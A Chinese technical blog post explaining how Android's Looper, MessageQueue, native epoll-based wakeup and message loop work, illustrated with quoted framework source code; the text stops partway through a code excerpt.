<p>与之前的<a href="http://www.viseator.com/2017/09/14/android_view_event_1/">触摸事件分发机制分析</a>的文章一样，<code>Android</code>系统机制的分析中关键的一环就是事件消息的处理。之前也说过，<code>Android</code>本质上是一个事件驱动的模型，通过各式各样不断产生事件消息的来推动UI、数据的更新与对我们交互的反馈，没有事件消息的产生，就不会有直观的界面的变化，也就不会有应用丰富的功能。</p>
<p>所以<code>Android</code>的消息机制与其他过程的关系是极其紧密的，例如启动<code>Activity</code>的过程就涉及到<code>ActivityManagerService</code>与应用主进程的通信，产生的通知消息通过<code>Binder</code>机制送入应用主进程的消息队列，再由主进程的消息循环来读取这一消息来进行处理。之前触摸事件分发中也是利用了应用主进程的消息队列来读取我们的触摸事件再进行后续的分发处理。可以说消息队列在各种通信过程中无处不在。</p>
<p>消息队列的存在为异步处理提供了一个非常好的基础，有了消息队列之后，我们就可以在新的线程中处理计算、IO密集、阻塞的任务而不会影响UI的更新，在处理过程中可以通过向消息队列中放入消息来进行UI的更新操作，而发送消息的行为也避免了工作线程为了等待返回而造成的阻塞。</p>
<p>可以说，想要了解其他基于事件的过程，对主线程消息机制的了解是必不可少的基础，在触摸事件分发机制分析的文章中我对消息机制还不是很了解，所以后来发现分析中有很多描述不妥的地方，所以在对消息机制的系统学习之后我又修改完善了这部分的内容。</p>
<a id="more"></a>
<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p><code>Android Studio</code>的<code>3.0</code>版本中引入了一个强大的性能分析工具：<code>Android Profiler</code>，对于它的详细介绍可以看<a href="https://developer.android.com/studio/profile/android-profiler.html" target="_blank" rel="noopener">官方的文档</a>。</p>
<p>我们对一个简单的<code>HelloWorld</code>应用进行方法分析：</p>
<p><img src="/images/android_event_1.png" alt=""></p>
<p>可以看到，对于这样一个没有任务需要处理的程序，这段时间中它一直执行的是<code>nativePollOnce()</code>方法，对于这个，<code>stackoverflow</code>上就有人提了<a href="https://stackoverflow.com/questions/38818642/android-what-is-message-queue-native-poll-once-in-android" target="_blank" rel="noopener">一个问题</a>。这个方法其实就是消息队列在队列中没有消息时处于等待状态执行的一个<code>Native</code>方法。</p>
<p>我们的分析就从消息队列(MessageQueue)与负责执行循环过程的<code>Looper</code>对象的创建与开始运行开始。</p>
<h2 id="Looper与MessageQueue的创建"><a href="#Looper与MessageQueue的创建" class="headerlink" title="Looper与MessageQueue的创建"></a>Looper与MessageQueue的创建</h2><p>当一个<code>Activity</code>被创建时，<code>ActivityThread</code>的<code>main()</code>方法会被执行（关于<code>Activity</code>创建过程的内容，请参阅启动分析相关的文章）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="string">"ActivityThreadMain"</span>);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    Looper.prepareMainLooper();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    Looper.loop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Main thread loop unexpectedly exited"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Looper的创建"><a href="#Looper的创建" class="headerlink" title="Looper的创建"></a>Looper的创建</h3><p>第5行中，调用<code>Looper</code>的<code>prepareMainLooper()</code>方法来创建<code>Looper</code>对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepareMainLooper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    prepare(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (Looper<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sMainLooper != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The main Looper has already been prepared."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sMainLooper = myLooper();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare</span><span class="params">(<span class="keyword">boolean</span> quitAllowed)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (sThreadLocal.get() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Only one Looper may be created per thread"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sThreadLocal.set(<span class="keyword">new</span> Looper(quitAllowed));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>sThreadLocal</code>对象的类型是<code>ThreadLocal&lt;Looper&gt;</code>是一个存放在<code>TLS</code>（<a href="https://en.wikipedia.org/wiki/Thread-local_storage" target="_blank" rel="noopener">Thread-local storage</a>)中的对象容器，储存在其中的对象的特点是每个线程中只有一个，并且个线程中储存的该对象不相同。</p>
<p>我们在这里新建了一个<code>Looper</code>对象并放入了<code>TLS</code>中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Looper</span><span class="params">(<span class="keyword">boolean</span> quitAllowed)</span> </span>&#123;</span><br><span class="line">    mQueue = <span class="keyword">new</span> MessageQueue(quitAllowed);</span><br><span class="line">    mThread = Thread.currentThread();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>mThread</code>保存了当前运行<code>Looper</code>的进程信息。</p>
<p>而<code>mQueue</code>就是与<code>Looper</code>对应的<code>MessageQueue</code>。</p>
<h3 id="MessageQueue的创建"><a href="#MessageQueue的创建" class="headerlink" title="MessageQueue的创建"></a>MessageQueue的创建</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MessageQueue(<span class="keyword">boolean</span> quitAllowed) &#123;</span><br><span class="line">    mQuitAllowed = quitAllowed;</span><br><span class="line">    mPtr = nativeInit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造函数十分简单，除了初始化<code>quitAllowed</code>标记之外，就是对<code>mPtr</code>的初始化了。</p>
<p>那么<code>mPtr</code>是什么呢？可以推测出的是，真正的<code>MessageQueue</code>的创建一定在<code>nativeInit</code>这个<code>Native</code>调用中，也就是说，我们的<code>MessageQueue</code>实际上存在于<code>Native</code>层。</p>
<p><code>android_os_MessageQueue.cpp</code>:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jlong <span class="title">android_os_MessageQueue_nativeInit</span><span class="params">(JNIEnv* env, jclass clazz)</span> </span>&#123;</span><br><span class="line">    NativeMessageQueue* nativeMessageQueue = <span class="keyword">new</span> NativeMessageQueue();</span><br><span class="line">    <span class="keyword">if</span> (!nativeMessageQueue) &#123;</span><br><span class="line">        jniThrowRuntimeException(env, <span class="string">"Unable to allocate native queue"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nativeMessageQueue-&gt;incStrong(env);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;jlong&gt;(nativeMessageQueue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>Native</code>层创建了一个<code>NativeMessageQueue</code>对象：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">NativeMessageQueue::NativeMessageQueue() :</span><br><span class="line">        mPollEnv(<span class="literal">NULL</span>), mPollObj(<span class="literal">NULL</span>), mExceptionObj(<span class="literal">NULL</span>) &#123;</span><br><span class="line">    mLooper = Looper::getForThread();</span><br><span class="line">    <span class="keyword">if</span> (mLooper == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        mLooper = <span class="keyword">new</span> Looper(<span class="literal">false</span>);</span><br><span class="line">        Looper::setForThread(mLooper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里做的事情可以和<code>Java</code>层进行对应：在<code>TLS</code>中创建了一个<code>Looper</code>对象，但这个<code>Looper</code>对象和<code>Java</code>层并不是同一个，并且他们的功能也不相同：<code>Java</code>层的<code>Looper</code>是为了处理的消息队列中的消息，<code>Native</code>中的<code>Looper</code>是为了处理注册的自定义<code>Fd</code>引起的<code>Request</code> 消息，这些消息一般来自于系统底层如触摸事件等（这个部分另开文章讲，这篇文章只关注一般的事件分发）。</p>
<p>我们来看看这个与<code>NativeMessageQueue</code>对应的<code>Native</code> <code>Looper</code>的构造：</p>
<h3 id="Native-Looper-创建与-Epoll的初始化"><a href="#Native-Looper-创建与-Epoll的初始化" class="headerlink" title="Native Looper 创建与 Epoll的初始化"></a>Native Looper 创建与 Epoll的初始化</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Looper::Looper(<span class="keyword">bool</span> allowNonCallbacks) :</span><br><span class="line">        mAllowNonCallbacks(allowNonCallbacks), mSendingMessage(<span class="literal">false</span>),</span><br><span class="line">        mPolling(<span class="literal">false</span>), mEpollFd(<span class="number">-1</span>), mEpollRebuildRequired(<span class="literal">false</span>),</span><br><span class="line">        mNextRequestSeq(<span class="number">0</span>), mResponseIndex(<span class="number">0</span>), mNextMessageUptime(LLONG_MAX) &#123;</span><br><span class="line">    mWakeEventFd = eventfd(<span class="number">0</span>, EFD_NONBLOCK | EFD_CLOEXEC);</span><br><span class="line">    LOG_ALWAYS_FATAL_IF(mWakeEventFd &lt; <span class="number">0</span>, <span class="string">"Could not make wake event fd: %s"</span>,</span><br><span class="line">                        strerror(errno));</span><br><span class="line"></span><br><span class="line">    AutoMutex _l(mLock);</span><br><span class="line">    rebuildEpollLocked();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就要涉及一些<code>Linux</code>中系统调用中<code>eventfd()</code>函数与多路I/O复用函数<code>epoll()</code>的相关知识了，这部分也是消息机制的底层核心。</p>
<p>上面的代码中第5行中使用<code>eventFd()</code>系统调用获取了一个<code>mWakeEventFd</code>作为后续<code>epoll()</code>用于唤醒的<code>File Descriper</code>（文件描述符）。这里是较之前版本有所不同的地方，网上找到的大部分分析文章中的这个地方还是使用的之前使用的管道机制，也就是通过<code>pipe()</code>系统调用来创建一对<code>Fd</code>，再利用这对<code>Fd</code>来进行监听唤醒操作。相比于管道，<code>Linux</code>在内核版本2.6.22引入的<code>eventFd</code>在解决这种简单的监听操作中的开销比较小，并且更加轻量。</p>
<p>我们现在有了一个<code>eventFd</code>对象的<code>Fd</code>，下面我们进入第10行的<code>rebuildEpollLocked()</code>调用：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Looper::rebuildEpollLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    mEpollFd = epoll_create(EPOLL_SIZE_HINT);</span><br><span class="line">    LOG_ALWAYS_FATAL_IF(mEpollFd &lt; <span class="number">0</span>, <span class="string">"Could not create epoll instance: %s"</span>, strerror(errno));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">eventItem</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp; eventItem, <span class="number">0</span>, <span class="keyword">sizeof</span>(epoll_event)); <span class="comment">// zero out unused members of data field union</span></span><br><span class="line">    eventItem.events = EPOLLIN;</span><br><span class="line">    eventItem.data.fd = mWakeEventFd;</span><br><span class="line">    <span class="keyword">int</span> result = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, mWakeEventFd, &amp; eventItem);</span><br><span class="line">    LOG_ALWAYS_FATAL_IF(result != <span class="number">0</span>, <span class="string">"Could not add wake event fd to epoll instance: %s"</span>,</span><br><span class="line">                        strerror(errno));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; mRequests.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> Request&amp; request = mRequests.valueAt(i);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">eventItem</span>;</span></span><br><span class="line">        request.initEventItem(&amp;eventItem);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, request.fd, &amp; eventItem);</span><br><span class="line">        <span class="keyword">if</span> (epollResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">"Error adding epoll events for fd %d while rebuilding epoll set: %s"</span>,</span><br><span class="line">                  request.fd, strerror(errno));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第3行中，进行了系统调用<code>epoll_create()</code>初始化了一个<code>epoll</code>实例。之后的6-9行创建了<code>epoll</code>注册需要使用的<code>eventItem</code>并设置了<code>events</code>属性与<code>fd</code>域。</p>
<p>在第10行，进行了系统调用<code>epoll_ctl()</code>来将之前创建的<code>mWakeEventFd</code>与<code>eventItem</code>注册到<code>epoll</code>。那么这些步骤的目的是什么呢？</p>
<p>简单地说，<code>epoll</code>这个系统提供的组件允许我们对多个文件描述符（<code>fd</code>）进行监听，注册监听的<code>fd</code>后，可以调用<code>epoll_wait()</code>函数，当<code>fd</code>所指向的对象的数据可用时，<code>epoll_wait()</code>函数就会返回，同时以<code>events</code>的形式返回发生改变的<code>fd</code>对应的<code>eventItem</code>。</p>
<p>借助这个功能，我们就可以实现在没有事件的时候让线程阻塞，当新的事件来临的时候让线程解除阻塞并唤醒。</p>
<p>到这里你可能会想，这样的功能使用一个标志量，不断地查询这个标志量，当标志量发生变化的时候唤醒不也可以实现相同的功能吗？为什么要使用这么复杂的机制呢？这是因为<code>Looper</code>同时为我们提供了<code>addFd()</code>函数让我们可以设置自定义的<code>fd</code>与对应的<code>event</code>，然后在<code>Native Looper</code>中对自定义的<code>fd</code>发生改变的事件进行处理（上面代码中后面的部分就是在处理这部分注册）。之前文章讲过的触摸事件分发就是这样做的。（再次说明这一剖分的内容另外一篇文章讲，本篇只涉及一般的消息处理机制）</p>
<p>现在，注册<code>epoll</code>的过程已经完成，<code>Native Looper</code>的初始化也到此结束。</p>
<p>现在我们回到<code>nativeInit</code>调用，它的返回值赋给了<code>Java</code>层<code>MessageQueue</code>的<code>mPtr</code>域：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jlong <span class="title">android_os_MessageQueue_nativeInit</span><span class="params">(JNIEnv* env, jclass clazz)</span> </span>&#123;</span><br><span class="line">    NativeMessageQueue* nativeMessageQueue = <span class="keyword">new</span> NativeMessageQueue();</span><br><span class="line">    <span class="keyword">if</span> (!nativeMessageQueue) &#123;</span><br><span class="line">        jniThrowRuntimeException(env, <span class="string">"Unable to allocate native queue"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nativeMessageQueue-&gt;incStrong(env);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;jlong&gt;(nativeMessageQueue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第9行就将创建的<code>NativeMessageQueue</code>对象的地址转换为一个<code>Java long</code>类型返回，之后调用<code>Native</code>方法的时候就会传入这个参数来找到这个<code>MessageQueue</code>。</p>
<p>用一张图来梳理这个过程：</p>
<p><img src="/images/android_event_2.png" alt=""></p>
<h2 id="消息循环"><a href="#消息循环" class="headerlink" title="消息循环"></a>消息循环</h2><h3 id="loop"><a href="#loop" class="headerlink" title="loop()"></a>loop()</h3><p>初始化过程结束后，我们回到<code>ActivityThread</code>的<code>main()</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Looper.loop();</span><br></pre></td></tr></table></figure>
<p>调用了<code>Looper</code>的<code>loop()</code>函数开始消息循环。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Looper me = myLooper();</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">final</span> MessageQueue queue = me.mQueue;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        Message msg = queue.next(); <span class="comment">// might block</span></span><br><span class="line">        <span class="keyword">if</span> (msg == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// No message indicates that the message queue is quitting.</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            msg.target.dispatchMessage(msg);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (traceTag != <span class="number">0</span>) &#123;</span><br><span class="line">                Trace.traceEnd(traceTag);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">        msg.recycleUnchecked();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>省略掉一些<code>log</code>的代码之后，我们看到第7行开始了一个无限循环，循环的第一步就是从<code>MessageQueue</code>里面获取一条<code>Message</code>，后面有一个注释告诉我们这个调用可能会阻塞。我们先不管这个调用具体情况，假设我们从这个调用中返回，我们先看后面的处理过程。</p>
<p>首先检查获取到的<code>msg</code>是否为<code>null</code>，如果为<code>null</code>，那么将会直接退出<code>loop()</code>函数，对于<code>Activity</code>的主线程来说，这个情况只会发生在应用退出的时候。</p>
<p>下面就直接调用了<code>Message</code>的<code>target</code>的<code>dispatchMessage()</code>函数，在使用<code>Handler</code>来发送消息的时候，这个<code>target</code>指的就是<code>Handler</code>本身，后面会看到这个过程。</p>
<h3 id="MessageQueue-next"><a href="#MessageQueue-next" class="headerlink" title="MessageQueue next()"></a>MessageQueue next()</h3><p>这个函数过程比较长， 我们分开来分析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Message <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">long</span> ptr = mPtr;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pendingIdleHandlerCount = -<span class="number">1</span>; <span class="comment">// -1 only during first iteration</span></span><br><span class="line">    <span class="keyword">int</span> nextPollTimeoutMillis = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">...</span><br><span class="line">        nativePollOnce(ptr, nextPollTimeoutMillis);</span><br></pre></td></tr></table></figure>
<p>第一部分是变量的初始化，如果<code>MessageQueue</code>的<code>mPtr</code>为0的话，说明<code>NativeMessageQueue</code>没有正确初始化，返回<code>null</code>结束消息循环。</p>
<p>下面定义了两个变量，第一个<code>pendingIdleHandlerCount</code>初始化为-1，它表示的是将要执行的空闲<code>Handler</code>数量，之后会用到。</p>
<p>第二个<code>nextPollTimeoutMillis</code>就是距下一条消息被处理需要等待的时间。</p>
<p>下面又进入了一个无限循环，注意第11行，我们看到了熟悉的调用，它是引入中讲的在没有事件处理的时候不断执行的函数。我们可以猜测，等待的过程就是发生在这个函数中的。</p>
<p>我们同样先看下面的处理，现在只要知道这个函数<strong>会造成阻塞，当有新的<code>Message</code>或者达到超时时间时才会返回</strong>，这点非常重要。</p>
<p>下面的过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">long</span> now = SystemClock.uptimeMillis(); <span class="comment">// 获取当前时刻</span></span><br><span class="line">    Message prevMsg = <span class="keyword">null</span>;</span><br><span class="line">    Message msg = mMessages; <span class="comment">// Message是一个链表的结构，而mMessages相当于"头指针"</span></span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="keyword">null</span> &amp;&amp; msg.target == <span class="keyword">null</span>) &#123;</span><br><span class="line">       <span class="comment">// 当message的target为null的时候，被认为是一个特殊的message，我们应当跳过这类message</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            prevMsg = msg;</span><br><span class="line">            msg = msg.next;</span><br><span class="line">        &#125; <span class="keyword">while</span> (msg != <span class="keyword">null</span> &amp;&amp; !msg.isAsynchronous());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (now &lt; msg.when) &#123;</span><br><span class="line">          <span class="comment">// 当时间还没到message的执行时间时，更新nextPollTimeoutMillis</span></span><br><span class="line">            nextPollTimeoutMillis = (<span class="keyword">int</span>) Math.min(msg.when - now, Integer.MAX_VALUE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// message到时间，需要被处理</span></span><br><span class="line">            mBlocked = <span class="keyword">false</span>; <span class="comment">// 取消阻塞状态标记</span></span><br><span class="line">            <span class="comment">// 从链表中取出表头的message</span></span><br><span class="line">            <span class="keyword">if</span> (prevMsg != <span class="keyword">null</span>) &#123;</span><br><span class="line">                prevMsg.next = msg.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mMessages = msg.next;</span><br><span class="line">            &#125;</span><br><span class="line">            msg.next = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Log.v(TAG, <span class="string">"Returning message: "</span> + msg);</span><br><span class="line">            msg.markInUse(); <span class="comment">// 标记使用状态</span></span><br><span class="line">            <span class="keyword">return</span> msg; <span class="comment">// 返回该message</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// msg == null，没有消息</span></span><br><span class="line">        nextPollTimeoutMillis = -<span class="number">1</span>; <span class="comment">// 如果该值为-1，nativePullOnce()将会无限执行直到有新的消息通知</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理退出消息循环的请求，返回null退出消息循环</span></span><br><span class="line">    <span class="keyword">if</span> (mQuitting) &#123;</span><br><span class="line">        dispose();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个过程比较简单，需要注意的就是<code>Message</code>的链表结构，每次取首元素来进行处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只会在第一次没有消息的时候执行，检查mIdleHandlers中注册的IdleHandler</span></span><br><span class="line"><span class="keyword">if</span> (pendingIdleHandlerCount &lt; <span class="number">0</span> &amp;&amp; (mMessages == <span class="keyword">null</span> || now &lt; mMessages.when)) &#123;</span><br><span class="line">    pendingIdleHandlerCount = mIdleHandlers.size();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果没有注册pendingIdleHandler，继续保持阻塞状态</span></span><br><span class="line"><span class="keyword">if</span> (pendingIdleHandlerCount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    mBlocked = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化mPendingHandlers</span></span><br><span class="line"><span class="keyword">if</span> (mPendingIdleHandlers == <span class="keyword">null</span>) &#123;</span><br><span class="line">    mPendingIdleHandlers = <span class="keyword">new</span> IdleHandler[Math.max(pendingIdleHandlerCount, <span class="number">4</span>)];</span><br><span class="line">&#125;</span><br><span class="line">mPendingIdleHandlers = mIdleHandlers.toArray(mPendingIdleHandlers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行pendingIdleHandler</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pendingIdleHandlerCount; i++) &#123;</span><br><span class="line">    <span class="keyword">final</span> IdleHandler idler = mPendingIdleHandlers[i];</span><br><span class="line">    mPendingIdleHandlers[i] = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">boolean</span> keep = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实质上是执行queueIdle()方法</span></span><br><span class="line">        keep = idler.queueIdle();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        Log.wtf(TAG, <span class="string">"IdleHandler threw exception"</span>, t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!keep) &#123;</span><br><span class="line">        <span class="comment">// 如果返回是false，则移除这个IdleHandler，不会再执行</span></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123; mIdleHandlers.remove(idler);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 重置pendingIdleHandler计数</span></span><br><span class="line">    pendingIdleHandlerCount = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 由于执行IdleHandler过程中可能已经有新的消息到来，故设置超时为0，直接检查新的消息</span></span><br><span class="line">    nextPollTimeoutMillis = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>mIdleHandlers</code>中注册了一些需要在没有消息处理时进行的任务，在处理这些任务的过程中使用了<code>pendingIdleHandler</code>作为临时容器。这个过程就是去执行这些<code>IdleHandler</code>的过程。</p>
<p>现在我们看完了返回消息的全过程，其中只有一环没有解决了：<code>nativePollOnce</code></p>
<h3 id="NativePollOnce"><a href="#NativePollOnce" class="headerlink" title="NativePollOnce()"></a>NativePollOnce()</h3><p>调用的是<code>Native</code>层<code>android_os_MessageQueue.cpp</code>下的函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_MessageQueue_nativePollOnce</span><span class="params">(JNIEnv* env, jobject obj,</span></span></span><br><span class="line"><span class="function"><span class="params">        jlong ptr, jint timeoutMillis)</span> </span>&#123;</span><br><span class="line">    NativeMessageQueue* nativeMessageQueue = <span class="keyword">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class="line">    nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据传入的地址，找到了之前新建的<code>NativeMessageQueue</code>对象，调用它的<code>pollOnce()</code>方法（注意参数中的<code>timeoutMillis</code>）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NativeMessageQueue::pollOnce</span><span class="params">(JNIEnv* env, jobject pollObj, <span class="keyword">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class="line">    mPollEnv = env;</span><br><span class="line">    mPollObj = pollObj;</span><br><span class="line">    mLooper-&gt;pollOnce(timeoutMillis);</span><br><span class="line">    mPollObj = <span class="literal">NULL</span>;</span><br><span class="line">    mPollEnv = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mExceptionObj) &#123;</span><br><span class="line">        env-&gt;Throw(mExceptionObj);</span><br><span class="line">        env-&gt;DeleteLocalRef(mExceptionObj);</span><br><span class="line">        mExceptionObj = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实调用的是保存的<code>NativeLooper</code>的<code>pollOnce()</code>方法（注意参数中的<code>timeoutMillis</code>）。</p>
<p>现在我将<code>NativeLooper</code>中关于<code>Native</code>事件循环的代码全部忽略，只分析与前面这个过程有关的部分：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::pollOnce</span><span class="params">(<span class="keyword">int</span> timeoutMillis, <span class="keyword">int</span>* outFd, <span class="keyword">int</span>* outEvents, <span class="keyword">void</span>** outData)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">        result = pollInner(timeoutMillis);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>pollInner()</code>方法（注意参数中的<code>timeoutMillis</code>），分为两部分分析：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::pollInner</span><span class="params">(<span class="keyword">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    mPolling = <span class="literal">true</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">eventItems</span>[<span class="title">EPOLL_MAX_EVENTS</span>];</span></span><br><span class="line">    <span class="keyword">int</span> eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis);</span><br><span class="line">    mPolling = <span class="literal">false</span>;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">// 检查轮询错误</span></span><br><span class="line">    <span 